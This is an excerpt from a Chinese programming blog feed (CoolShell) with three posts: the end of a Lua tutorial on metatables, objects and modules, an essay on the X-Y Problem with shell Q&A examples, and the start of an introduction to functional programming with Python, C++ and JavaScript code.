<pre data-enlighter-language="c" class="EnlighterJSRAW">_G.globalVar
_G["globalVar"]</pre>
<p>我们可以通过下面的方式来遍历一个Table。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">for k, v in pairs(t) do
    print(k, v)
end</pre>
<h4>
<span class="ez-toc-section" id="MetaTable_%E5%92%8C_MetaMethod"></span>MetaTable 和 MetaMethod<span class="ez-toc-section-end"></span>
</h4>
<p>MetaTable和MetaMethod是Lua中的重要的语法，MetaTable主要是用来做一些类似于C++重载操作符式的功能。</p>
<p>比如，我们有两个分数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">fraction_a = {numerator=2, denominator=3}
fraction_b = {numerator=4, denominator=7}</pre>
<p>我们想实现分数间的相加：2/3 + 4/7，我们如果要执行： fraction_a + fraction_b，会报错的。</p>
<p>所以，我们可以动用MetaTable，如下所示：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">fraction_op={}
function fraction_op.__add(f1, f2)
    ret = {}
    ret.numerator = f1.numerator * f2.denominator + f2.numerator * f1.denominator
    ret.denominator = f1.denominator * f2.denominator
    return ret
end
</pre>
<p>为之前定义的两个table设置MetaTable：（其中的setmetatble是库函数）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">setmetatable(fraction_a, fraction_op)
setmetatable(fraction_b, fraction_op)</pre>
<p>于是你就可以这样干了：（调用的是fraction_op.__add()函数）</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">fraction_s = fraction_a + fraction_b</code></p>
<p>至于__add这是MetaMethod，这是Lua内建约定的，其它的还有如下的MetaMethod：</p>
<pre>__add(a, b)                     对应表达式 a + b
__sub(a, b)                     对应表达式 a - b
__mul(a, b)                     对应表达式 a * b
__div(a, b)                     对应表达式 a / b
__mod(a, b)                     对应表达式 a % b
__pow(a, b)                     对应表达式 a ^ b
__unm(a)                        对应表达式 -a
__concat(a, b)                  对应表达式 a .. b
__len(a)                        对应表达式 #a
__eq(a, b)                      对应表达式 a == b
__lt(a, b)                      对应表达式 a &lt; b
__le(a, b)                      对应表达式 a &lt;= b
__index(a, b)                   对应表达式 a.b
__newindex(a, b, c)             对应表达式 a.b = c
__call(a, ...)                  对应表达式 a(...)</pre>
<h4>
<span class="ez-toc-section" id="%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"></span>“面向对象”<span class="ez-toc-section-end"></span>
</h4>
<p>上面我们看到有__index这个重载，这个东西主要是重载了find key的操作。这操作可以让Lua变得有点面向对象的感觉，让其有点像Javascript的prototype。（关于Javascrip的面向对象，你可以参看我之前写的<a title="Javascript 面向对象编程" href="https://coolshell.cn/articles/6441.html" target="_blank">Javascript的面向对象</a>）</p>
<p>所谓__index，说得明确一点，如果我们有两个对象a和b，我们想让b作为a的prototype只需要：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">setmetatable(a, {__index = b})</code></p>
<p>例如下面的示例：你可以用一个Window_Prototype的模板加上__index的MetaMethod来创建另一个实例：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Window_Prototype = {x=0, y=0, width=100, height=100}
MyWin = {title="Hello"}
setmetatable(MyWin, {__index = Window_Prototype})</pre>
<p>于是：MyWin中就可以访问x, y, width, height的东东了。（注：当表要索引一个值时如table[key], Lua会首先在table本身中查找key的值, 如果没有并且这个table存在一个带有__index属性的Metatable, 则Lua会按照__index所定义的函数逻辑查找）</p>
<p>有了以上的基础，我们可以来说说所谓的Lua的面向对象。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Person={}

function Person:new(p)
    local obj = p
    if (obj == nil) then
        obj = {name="ChenHao", age=37, handsome=true}
    end
    self.__index = self
    return setmetatable(obj, self)
end

function Person:toString()
    return self.name .." : ".. self.age .." : ".. (self.handsome and "handsome" or "ugly")
end
</pre>
<p>上面我们可以看到有一个new方法和一个toString的方法。其中：</p>
<p>1）self 就是 Person，Person:new(p)，相当于Person.new(self, p)<br>
2）new方法的self.__index = self 的意图是怕self被扩展后改写，所以，让其保持原样<br>
3）setmetatable这个函数返回的是第一个参数的值。</p>
<p>于是：我们可以这样调用：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">me = Person:new()
print(me:toString())

kf = Person:new{name="King's fucking", age=70, handsome=false}
print(kf:toString())
</pre>
<p>继承如下，我就不多说了，Lua和Javascript很相似，都是在Prototype的实例上改过来改过去的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Student = Person:new()

function Student:new()
    newObj = {year = 2013}
    self.__index = self
    return setmetatable(newObj, self)
end

function Student:toString()
    return "Student : ".. self.year.." : " .. self.name
end</pre>
<h4>
<span class="ez-toc-section" id="%E6%A8%A1%E5%9D%97"></span>模块<span class="ez-toc-section-end"></span>
</h4>
<p>我们可以直接使用require(“model_name”)来载入别的lua文件，文件的后缀是.lua。载入的时候就直接执行那个文件了。比如：</p>
<p>我们有一个hello.lua的文件：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">print("Hello, World!")</code></p>
<p>如果我们：require(“hello”)，那么就直接输出Hello, World！了。</p>
<p>注意：<br>
1）require函数，载入同样的lua文件时，只有第一次的时候会去执行，后面的相同的都不执行了。<br>
2）如果你要让每一次文件都会执行的话，你可以使用dofile(“hello”)函数<br>
3）如果你要玩载入后不执行，等你需要的时候执行时，你可以使用 loadfile()函数，如下所示：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">local hello = loadfile("hello")
... ...
... ...
hello()</pre>
<p>loadfile(“hello”)后，文件并不执行，我们把文件赋给一个变量hello，当hello()时，才真的执行。（我们多希望JavaScript也有这样的功能（参看《<a title="Javascript 装载和执行" href="https://coolshell.cn/articles/9749.html" target="_blank">Javascript 装载和执行</a>》））</p>
<p>当然，更为标准的玩法如下所示。</p>
<p>假设我们有一个文件叫mymod.lua，内容如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">local HaosModel = {}

local function getname()
    return "Hao Chen"
end

function HaosModel.Greeting()
    print("Hello, My name is "..getname())
end

return HaosModel</pre>
<p>于是我们可以这样使用：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">local hao_model = require("mymod")
hao_model.Greeting()</pre>
<p>其实，require干的事就如下：（所以你知道为什么我们的模块文件要写成那样了）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">local hao_model = (function ()
  --mymod.lua文件的内容--
end)()</pre>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<p>我估计你差不多到擦屁股的时间了，所以，如果你还比较喜欢Lua的话，下面是几个在线文章你可以继续学习之：</p>
<ul>
<li>
<a href="http://manual.luaer.cn/" rel="nofollow">manual.luaer.cn</a> lua在线手册</li>
<li>
<a href="http://book.luaer.cn/" rel="nofollow">book.luaer.cn</a> lua在线lua学习教程</li>
<li>
<a href="http://www.codingnow.com/2000/download/lua_manual.html" rel="nofollow">lua参考手册</a>Lua参考手册的中文翻译（云风翻译版本）</li>
</ul>
<p>关于Lua的标库，你可以看看官方文档：<a href="http://lua-users.org/wiki/StringLibraryTutorial" target="_blank">string</a>，  <a href="http://lua-users.org/wiki/TableLibraryTutorial" target="_blank">table</a>， <a href="http://lua-users.org/wiki/MathLibraryTutorial" target="_blank">math</a>， <a href="http://lua-users.org/wiki/IoLibraryTutorial" target="_blank">io</a>， <a href="http://lua-users.org/wiki/OsLibraryTutorial" target="_blank">os</a>。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-12-03T08:29:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/10739.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ X-Y Problem ]]></title>
<link>https://coolshell.cn/articles/10804.html</link>
<content><![CDATA[ 
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#X-Y_Problem" title="X-Y Problem">X-Y Problem</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%A4%BA%E4%BE%8B" title="示例">示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%80%E4%BA%9B%E5%8F%98%E7%A7%8D" title="一些变种">一些变种</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="X-Y_Problem"></span><img alt="image placeholder" >X-Y Problem<span class="ez-toc-section-end"></span>
</h4>
<p>对于X-Y Problem的意思如下：</p>
<p>1）有人想解决问题X<br>
2）他觉得Y可能是解决X问题的方法<br>
3）但是他不知道Y应该怎么做<br>
4）于是他去问别人Y应该怎么做？</p>
<p>简而言之，<strong>没有去问怎么解决问题X，而是去问解决方案Y应该怎么去实现和操作</strong>。于是乎：</p>
<p>1）热心的人们帮助并告诉这个人Y应该怎么搞，但是大家都觉得Y这个方案有点怪异。<br>
2）在经过大量地讨论和浪费了大量的时间后，热心的人终于明白了原始的问题X是怎么一回事。<br>
3）于是大家都发现，Y根本就不是用来解决X的合适的方案。</p>
<p>X-Y Problem最大的严重的问题就是：<strong>在一个根本错误的方向上浪费他人大量的时间和精力</strong>！</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B"></span>示例<span class="ez-toc-section-end"></span>
</h4>
<p>举个两个例子：</p>
<blockquote><p>Q) 我怎么用Shell取得一个字符串的后3位字符？<br>
A1) 如果这个字符的变量是$foo，你可以这样来 echo ${foo:-3}<br>
A2) 为什么你要取后3位？你想干什么？<br>
Q) 其实我就想取文件的扩展名<br>
A1) 我靠，原来你要干这事，那我的方法不对，文件的扩展名并不保证一定有3位啊。<br>
A1) 如果你的文件必然有扩展名的话，你可以这来样来：echo ${foo##*.}</p></blockquote>
<p><span id="more-10804"></span></p>
<p>再来一个示例：</p>
<blockquote><p>Q）问一下大家，我如何得到一个文件的大小<br>
A1)  size = `ls -l $file  | awk ‘{print $5}’`<br>
Q) 哦，要是这个文件名是个目录呢？<br>
A2) 用du吧<br>
A3) 不好意思，你到底是要文件的大小还是目录的大小？你到底要干什么？<br>
Q)  我想把一个目录下的每个文件的每个块（第一个块有512个字节）拿出来做md5，并且计算他们的大小 ……<br>
A1) 哦，你可以使用dd吧。<br>
A2) dd不行吧。<br>
A3) 你用md5来计算这些块的目的是什么？你究竟想干什么啊？<br>
Q) 其实，我想写一个网盘，对于小文件就直接传输了，对于大文件我想分块做增量同步。<br>
A2) 用rsync啊，你妹！</p></blockquote>
<p><a href="http://www.perlmonks.org/index.pl?node_id=542341" target="_blank">这里有篇文章</a>说明了X-Y Problem的各种案例说明，我从其中摘出三个来让大家看看：</p>
<blockquote>
<p>你试图做X，并想到了用Y方案。所以你去问别人Y，但根本不提X。于是，你可以会错过本来可能有更好更适合的方案，除非你告诉大家X是什么。</p>
<p>— <i>from <a href="http://www.perlmonks.org/index.pl?node_id=430320">Re: How do I keep the command line from eating the backslashes?</a> by <a href="http://www.perlmonks.org/index.pl?node_id=163683">revdiablo</a></i></p>
</blockquote>
<blockquote>
<p>有些人问怎么做Y，但其它他想做的是X。他问怎么做Y是因为他觉得Y是最好搞定X的方法。 于是大家不断地回答“试试这个，试试那个”来帮助他，而他总是在说“这个有问题，那个有问题，因为……”。基本不同的情况，其它的方案可能会更好。</p>
<p>— <i>from <a href="http://www.perlmonks.org/index.pl?node_id=327963">Re: Re: Re: Re: regex to validate e-mail addresses and phone numbers</a> by <a href="http://www.perlmonks.org/index.pl?node_id=180961">Limbic~Region</a></i></p>
</blockquote>
<blockquote>
<p>X-Y Problem又叫“过早下结论”：提问者其实并不非常清楚想要解决的X问题，他猜测用Y可以搞定，于是他问大家如何实现Y。</p>
<p>— <i>from <a href="https://groups.google.com/groups?hl=en&amp;selm=Pine.GHP.4.21.0009061210570.8800-100000@hpplus03.cern.ch">&lt;<span class="__cf_email__" data-cfemail="15457c7b703b525d453b213b27243b2525252c2523242724252022253b2d2d252538242525252525557d656579606625263b7670677b3b767d">[email protected]</span>&gt;</a> by Alan J. Flavell</i></p>
</blockquote>
<p>其实这个问题在我之前的《<a title="你会问问题吗？" href="https://coolshell.cn/articles/3713.html" target="_blank">你会问问题吗</a>》里提到的那篇How To Ask Questions the Smart Way中的提到过，你可以<a href="http://www.beiww.com/doc/oss/smart-questions.html#id265951" target="_blank">移步去看一下</a>。</p>
<p>所以，我们在寻求别人帮助的时候，最好把我们想解决的问题和整个事情的来龙去脉说清楚。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%BA%9B%E5%8F%98%E7%A7%8D"></span>一些变种<span class="ez-toc-section-end"></span>
</h4>
<p>我们不要以为X-Y Problem就像上面那样的简单，我们不会出现，其实我们生活的这个世界有有各种X-Y Problem的变种。下面我个人觉得非常像XY Problem的总是：</p>
<p style="padding-left: 30px;">其一、大多数人有时候，非常容易把手段当目的，他们会用自己所喜欢的技术和方法来反推用户的需求，于是很有可能就会出现X-Y Problem – 也许解决用户需求最适合的技术方案是PC，但是我们要让他们用手机。</p>
<p style="padding-left: 30px;">其二、产品经理有时候并不清楚他想解决的用户需求是什么，于是他觉得可能开发Y的功能能够满足用户，于是他提出了Y的需求让技术人员去做，但那根本不是解决X问题的最佳方案。</p>
<p style="padding-left: 30px;">其三、因为公司或部门的一些战略安排，业务部门设计了相关的业务规划，然后这些业务规划更多的是公司想要的Y，而不是解决用户的X问题。</p>
<p style="padding-left: 30px;">其四、对于个人的职业发展，X是成长为有更强的技能和能力，这个可以拥有比别人更强的竞争力，从而可以有更好的报酬，但确走向了Y：全身心地追逐KPI。</p>
<p style="padding-left: 30px;">其五、本来我们想达成的X是做出更好和更有价值的产品，但最终走到了Y：通过各种手段提升安装量，点击量，在线量，用户量来衡量。</p>
<p style="padding-left: 30px;">其六、很多团队Leader都喜欢制造信息不平等，并不告诉团队某个事情的来由，掩盖X，而直接把要做的Y告诉团队，导致团队并不真正地理解，而产生了很多时间和经历的浪费。</p>
<p>所有的这些，在我心中都是X-Y Problem的变种，这是不是一种刻舟求剑的表现？</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://meta.stackoverflow.com/questions/66377/what-is-the-xy-problem" target="_blank">StackOverflow: What is XY Problem?</a></li>
<li><a href="http://www.perlmonks.org/?node_id=542341" target="_blank">PerlMonks: XY Problem</a></li>
<li><a href="http://mywiki.wooledge.org/XyProblem" target="_blank">Greg’s Wiki</a></li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-12-16T10:22:37+08:00</pubDate>
<guid>https://coolshell.cn/articles/10804.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 函数式编程 ]]></title>
<link>https://coolshell.cn/articles/10822.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >当我们说起函数式编程来说，我们会看到如下函数式编程的长相：</p>
<ul>
<li>函数式编程的三大特性：
<ul>
<li>
<strong>immutable data 不可变数据</strong>：像Clojure一样，默认上变量是不可变的，如果你要改变变量，你需要把变量copy出去修改。这样一来，可以让你的程序少很多Bug。因为，程序中的状态不好维护，在并发的时候更不好维护。（你可以试想一下如果你的程序有个复杂的状态，当以后别人改你代码的时候，是很容易出bug的，在并行中这样的问题就更多了）</li>
<li>
<strong>first class functions</strong>：这个技术可以让你的函数就像变量一样来使用。也就是说，你的函数可以像变量一样被创建，修改，并当成变量一样传递，返回或是在函数中嵌套函数。这个有点像Javascript的Prototype（参看<a title="再谈javascript面向对象编程" href="https://coolshell.cn/articles/6668.html" target="_blank" rel="noopener noreferrer">Javascript的面向对象编程</a>）</li>
<li>
<strong>尾递归优化</strong>：我们知道递归的害处，那就是如果递归很深的话，stack受不了，并会导致性能大幅度下降。所以，我们使用尾递归优化技术——每次递归时都会重用stack，这样一来能够提升性能，当然，这需要语言或编译器的支持。Python就不支持。</li>
</ul>
</li>
</ul>
<ul>
<li>函数式编程的几个技术
<ul>
<li>
<strong>map &amp; reduce</strong> ：这个技术不用多说了，函数式编程最常见的技术就是对一个集合做Map和Reduce操作。这比起过程式的语言来说，在代码上要更容易阅读。（传统过程式的语言需要使用for/while循环，然后在各种变量中把数据倒过来倒过去的）这个很像C++中的STL中的foreach，find_if，count_if之流的函数的玩法。</li>
<li>
<strong>pipeline</strong>：这个技术的意思是，把函数实例成一个一个的action，然后，把一组action放到一个数组或是列表中，然后把数据传给这个action list，数据就像一个pipeline一样顺序地被各个函数所操作，最终得到我们想要的结果。</li>
<li>
<strong>recursing 递归</strong> ：递归最大的好处就简化代码，他可以把一个复杂的问题用很简单的代码描述出来。注意：递归的精髓是描述问题，而这正是函数式编程的精髓。</li>
<li>
<strong>currying</strong>：把一个函数的多个参数分解成多个函数， 然后把函数多层封装起来，每层函数都返回一个函数去接收下一个参数这样，可以简化函数的多个参数。在C++中，这个很像STL中的bind_1st或是bind2nd。</li>
<li>
<strong>higher order function 高阶函数</strong>：所谓高阶函数就是函数当参数，把传入的函数做一个封装，然后返回这个封装函数。现象上就是函数传进传出，就像面向对象对象满天飞一样。</li>
</ul>
</li>
</ul>
<p><span id="more-10822"></span></p>
<ul>
<li>还有函数式的一些好处
<ul>
<li>
<strong>parallelization 并行：</strong>所谓并行的意思就是在并行环境下，各个线程之间不需要同步或互斥。</li>
<li>
<strong>lazy evaluation 惰性求值</strong>：这个需要编译器的支持。表达式不在它被绑定到变量之后就立即求值，而是在该值被取用的时候求值，也就是说，语句如<i>x:=expression;</i> (把一个表达式的结果赋值给一个变量)明显的调用这个表达式被计算并把结果放置到 <i>x</i> 中，但是先不管实际在 <i>x</i> 中的是什么，直到通过后面的表达式中到 <i>x</i> 的引用而有了对它的值的需求的时候，而后面表达式自身的求值也可以被延迟，最终为了生成让外界看到的某个符号而计算这个快速增长的依赖树。</li>
<li>
<strong>determinism 确定性</strong>：所谓确定性的意思就是像数学那样 f(x) = y ，这个函数无论在什么场景下，都会得到同样的结果，这个我们称之为函数的确定性。而不是像程序中的很多函数那样，同一个参数，却会在不同的场景下计算出不同的结果。所谓不同的场景的意思就是我们的函数会根据一些运行中的状态信息的不同而发生变化。</li>
</ul>
</li>
</ul>
<p>上面的那些东西太抽象了，还是让我们来循序渐近地看一些例子吧。</p>
<p>我们先用一个最简单的例子来说明一下什么是函数式编程。</p>
<p>先看一个非函数式的例子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int cnt;
void increment(){
    cnt++;
}</pre>
<p> </p>
<p>那么，函数式的应该怎么写呢？</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int increment(int cnt){
    return cnt+1;
}</pre>
<p>你可能会觉得这个例子太普通了。是的，这个例子就是函数式编程的准则：<strong>不依赖于外部的数据，而且也不改变外部数据的值，而是返回一个新的值给你</strong>。</p>
<p>我们再来看一个简单例子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def inc(x):
    def incx(y):
        return x+y
    return incx

inc2 = inc(2)
inc5 = inc(5)

print inc2(5) # 输出 7
print inc5(5) # 输出 10</pre>
<p>我们可以看到上面那个例子inc()函数返回了另一个函数incx()，于是我们可以用inc()函数来构造各种版本的inc函数，比如：inc2()和inc5()。这个技术其实就是上面所说的Currying技术。从这个技术上，你可能体会到函数式编程的理念：<strong>把函数当成变量来用，关注于描述问题而不是怎么实现</strong>，这样可以让代码更易读。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Map_Reduce" title="Map &amp; Reduce">Map &amp; Reduce</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Declarative_Programming_vs_Imperative_Programming" title="Declarative Programming vs Imperative Programming">Declarative Programming vs Imperative Programming</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Pipeline" title="Pipeline">Pipeline</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Map_Reduce"></span>Map &amp; Reduce<span class="ez-toc-section-end"></span>
</h4>
<p>在函数式编程中，我们不应该用循环迭代的方式，我们应该用更为高级的方法，如下所示的Python代码</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">name_len = map(len, ["hao", "chen", "coolshell"])
print name_len
# 输出 [3, 4, 9]</pre>
<p>你可以看到这样的代码很易读，因为，<strong>这样的代码是在描述要干什么，而不是怎么干</strong>。</p>
<p>我们再来看一个Python代码的例子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def toUpper(item):
return item.upper()

upper_name = map(toUpper, ["hao", "chen", "coolshell"])
print upper_name
# 输出 ['HAO', 'CHEN', 'COOLSHELL']</pre>
<p>顺便说一下，上面的例子个是不是和我们的STL的transform有些像？</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;iostream&gt;
#include &lt;algorithm&gt;
#include &lt;string&gt;
using namespace std;

int main() {
    string s="hello";
    string out;
    transform(s.begin(), s.end(), back_inserter(out), ::toupper);
    cout &lt;&lt; out &lt;&lt; endl;
    // 输出：HELLO
}</pre>
<p>在上面Python的那个例子中我们可以看到，我们写义了一个函数toUpper，这个函数没有改变传进来的值，只是把传进来的值做个简单的操作，然后返回。然后，我们把其用在map函数中，就可以很清楚地描述出我们想要干什么。而不会去理解一个在循环中的怎么实现的代码，最终在读了很多循环的逻辑后才发现原来是这个或那个意思。 下面，我们看看描述实现方法的过程式编程是怎么玩的（看上去是不是不如函数式的清晰？）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">upname =['HAO', 'CHEN', 'COOLSHELL']
lowname =[]
for i in range(len(upname)):
lowname.append( upname[i].lower() )</pre>
<p>对于map我们别忘了lambda表达式：你可以简单地理解为这是一个inline的匿名函数。下面的lambda表达式相当于：def func(x): return x*x</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">squares = map(lambda x: x * x, range(9))
print squares
# 输出 [0, 1, 4, 9, 16, 25, 36, 49, 64]</pre>
<p>我们再来看看reduce怎么玩？（下面的lambda表达式中有两个参数，也就是说每次从列表中取两个值，计算结果后把这个值再放回去，下面的表达式相当于：<code>((((1+2)+3)+4)+5) ）</code></p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">print reduce(lambda x, y: x+y, [1, 2, 3, 4, 5])
# 输出 15</pre>
<p>Python中的除了map和reduce外，还有一些别的如filter, find, all, any的函数做辅助（其它函数式的语言也有），可以让你的代码更简洁，更易读。 我们再来看一个比较复杂的例子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python"># 计算数组中正数的平均值",
num =[2, -5, 9, 7, -2, 5, 3, 1, 0, -3, 8]
positive_num_cnt = 0
positive_num_sum = 0
for i in range(len(num)):
    if num[i] &gt; 0:
        positive_num_cnt += 1
        positive_num_sum += num[i]

if positive_num_cnt &gt; 0:
    average = positive_num_sum / positive_num_cnt

print average
# 输出 5</pre>
<p>如果用函数式编程，这个例子可以写成这样：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">positive_num = filter(lambda x: x&gt;0, num)
average = reduce(lambda x,y: x+y, positive_num) / len( positive_num )</pre>
<p>C++11玩的法：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">#include &lt;iostream&gt;
#include &lt;algorithm&gt;
#include &lt;numeric&gt;
#include &lt;string&gt;
#include &lt;vector&gt;
using namespace std;

vector num {2, -5, 9, 7, -2, 5, 3, 1, 0, -3, 8};
vector p_num;
copy_if(num.begin(), num.end(), back_inserter(p_num), [](int i){ return (i&gt;0);} );
int average = accumulate(p_num.begin(), p_num.end(), 0) / p_num.size();
cout &lt;&lt; "averge: " &lt;&lt; average &lt;&lt; endl;</pre>
<p>我们可以看到，函数式编程有如下好处：</p>
<p style="padding-left: 30px;">1）代码更简单了。<br>
2）数据集，操作，返回值都放到了一起。<br>
3）你在读代码的时候，没有了循环体，于是就可以少了些临时变量，以及变量倒来倒去逻辑。<br>
4）你的代码变成了在描述你要干什么，而不是怎么去干。</p>
<p>最后，我们来看一下Map/Reduce这样的函数是怎么来实现的（下面是Javascript代码）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">//map函数
var map = function (mappingFunction, list) {
    var result = [];
    forEach(list, function (item) {
        result.push(mappingFunction(item));
    });
    return result;
};</pre>
<p>下面是reduce函数的javascript实现（谢谢 <a href="https://weibo.com/u/1772898707" target="_blank" rel="noopener noreferrer">@下雨在家</a> 修正的我原来的简单版本）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">//reduce函数
function reduce(actionFunction, list, initial){
    var accumulate;
    var temp;
    if(initial){
        accumulate = initial;
    }else{
        accumulate = list.shfit();
    }
    temp = list.shift();
    while(temp){
        accumulate = actionFunction(accumulate,temp);
        temp = list.shift();
    }
    return accumulate;
};</pre>
<h4>
<span class="ez-toc-section" id="Declarative_Programming_vs_Imperative_Programming"></span>Declarative Programming vs Imperative Programming<span class="ez-toc-section-end"></span>
</h4>
<p>前面提到过多次的函数式编程关注的是：describe what to do, rather than how to do it. 于是，我们把以前的过程式的编程范式叫做 <a href="https://en.wikipedia.org/wiki/Imperative_programming" target="_blank" rel="noopener noreferrer">Imperative Programming</a> – 指令式编程，而把函数式的这种范式叫做 <a href="https://en.wikipedia.org/wiki/Declarative_programming" target="_blank" rel="noopener noreferrer">Declarative Programming</a> – 声明式编程。</p>
<p>下面我们看一下相关的示例（本示例来自<a href="http://maryrosecook.com/post/a-practical-introduction-to-functional-programming" target="_blank" rel="noopener noreferrer">这篇文章</a> ）。</p>
<p>比如，我们有3辆车比赛，简单起见，我们分别给这3辆车有70%的概率可以往前走一步，一共有5次机会，我们打出每一次这3辆车的前行状态。</p>
<p>对于Imperative Programming来说，代码如下（Python）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from random import random

time = 5
car_positions = [1, 1, 1]

while time:
    # decrease time
    time -= 1

    print ''
    for i in range(len(car_positions)):
        # move car
        if random() &gt; 0.3:
            car_positions[i] += 1

        # draw car
        print '-' * car_positions[i]</pre>
<p>我们可以把这个两重循环变成一些函数模块，这样有利于我们更容易地阅读代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from random import random
def move_cars():
    for i, _ in enumerate(car_positions):
        if random() &gt; 0.3:
            car_positions[i] += 1
def draw_car(car_position):
    print '-' * car_position
def run_step_of_race():
    global time
    time -= 1
    move_cars()
def draw():
    print ''
    for car_position in car_positions:
        draw_car(car_position)
time = 5
car_positions = [1, 1, 1]
while time:
    run_step_of_race()
    draw()</pre>
<p>上面的代码，我们可以从主循环开始，我们可以很清楚地看到程序的主干，因为我们把程序的逻辑分成了几个函数，这样一来，我们的代码逻辑也会变得几个小碎片，于是我们读代码时要考虑的上下文就少了很多，阅读代码也会更容易。不像第一个示例，如果没有注释和说明，你还是需要花些时间理解一下。<strong>而把代码逻辑封装成了函数后，我们就相当于给每个相对独立的程序逻辑取了个名字，于是代码成了自解释的</strong>。</p>
<p>但是，你会发现，封装成函数后，这些函数都会依赖于共享的变量来同步其状态。于是，我们在读代码的过程时，每当我们进入到函数里，一量读到访问了一个外部的变量，我们马上要去查看这个变量的上下文，然后还要在大脑里推演这个变量的状态， 我们才知道程序的真正逻辑。也就是说，<strong>这些函数间必需知道其它函数是怎么修改它们之间的共享变量的，所以，这些函数是有状态的</strong>。</p>
<p>我们知道，有状态并不是一件很好的事情，无论是对代码重用，还是对代码的并行来说，都是有副作用的。因此，我们要想个方法把这些状态搞掉，于是出现了我们的 Functional Programming 的编程范式。下面，我们来看看函数式的方式应该怎么写？</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from random import random

def move_cars(car_positions):
    return map(lambda x: x + 1 if random() &gt; 0.3 else x,
               car_positions)

def output_car(car_position):
    return '-' * car_position

def run_step_of_race(state):
    return {'time': state['time'] - 1,
            'car_positions': move_cars(state['car_positions'])}

def draw(state):
    print ''
    print '\n'.join(map(output_car, state['car_positions']))

def race(state):
    draw(state)
    if state['time']:
        race(run_step_of_race(state))

race({'time': 5,
      'car_positions': [1, 1, 1]})</pre>
<p>上面的代码依然把程序的逻辑分成了函数，不过这些函数都是functional的。因为它们有三个症状：</p>
<p style="padding-left: 30px;">1）它们之间没有共享的变量。<br>
2）函数间通过参数和返回值来传递数据。<br>
3）在函数里没有临时变量。</p>
